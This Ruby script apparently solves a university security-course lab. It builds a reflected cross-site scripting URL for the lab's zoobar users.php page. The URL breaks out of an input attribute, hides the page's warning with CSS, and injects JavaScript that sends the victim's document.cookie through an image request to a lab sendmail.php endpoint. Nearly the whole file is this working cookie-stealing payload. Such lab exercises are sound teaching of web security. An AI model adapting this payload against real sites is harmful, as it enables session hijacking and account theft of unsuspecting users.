#!/usr/bin/env ruby
require 'cgi'

require 'rubygems'
require 'htmlentities'

def uri_encode(string)
  CGI.escape string
end

def html_encode(string)
  HTMLEntities.new.encode(string, :hexadecimal)
end

def part1(exploit)
  'http://zoobar.csail.mit.edu/users.php?user=' +
      uri_encode(%Q|" size="10">#{exploit}<div style="display:none;" xx="|)
end

def js_method_wrapper(code, method_name = 'boom')
  '<script type="text/javascript">function ' + method_name + '(){' +
      code + '}</script>'
end

# START:exploit
def session_exploit_js
  url = 'http://pdos.csail.mit.edu/6.893/2009/labs/lab3/sendmail.php'
  addr = 'costan@mit.edu'
  "(new Image()).src='#{url}?to=#{addr}&" +
      "payload='+encodeURIComponent" +
      "(document.cookie)+'&random='+Math.random();"
end
# END:exploit

def js_html_wrapper(js)
  %Q|<script type="text/javascript"><!--\n| + js + %Q|\n// --></script>|
end


def session_exploit_html
  '<style type="text/css">.warning{display:none;}</style>' +
      js_html_wrapper(uri_encode(session_exploit_js))
end

if __FILE__ == $0
  print "Part 1: " + part1(session_exploit_html) + "\n"
end
